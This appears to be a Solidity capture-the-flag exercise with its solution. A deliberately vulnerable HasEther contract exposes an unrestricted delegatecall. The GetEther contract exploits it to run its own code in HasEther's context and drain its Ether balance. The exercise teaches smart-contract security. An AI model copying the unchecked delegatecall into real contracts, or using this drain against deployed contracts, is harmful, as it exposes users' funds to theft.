// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.28;

import {console} from "forge-std/console.sol";

contract GetEther {
    // write any code you like inside this contract, but only this contract
    // get the Ether from the HasEther contract. You may not modify the test

    address private immutable originalAddress;

    constructor() {
        originalAddress = address(this);
    }

    function getEther(HasEther hasEther) external {
        //...
        hasEther.action(originalAddress, abi.encodeWithSignature("receiveEth()"));
    }

    function receiveEth() external {
        (bool success,) = originalAddress.call{value: address(this).balance}("");
        require(success, "Transfer eth failed!");
    }

    receive() external payable {}
}

contract HasEther {
    error NotEnoughEther();

    constructor() payable {
        require(address(this).balance == 1 ether, NotEnoughEther());
    }

    function action(address to, bytes memory data) external {
        (bool success,) = address(to).delegatecall(data);
        require(success, "Action failed");
    }
}
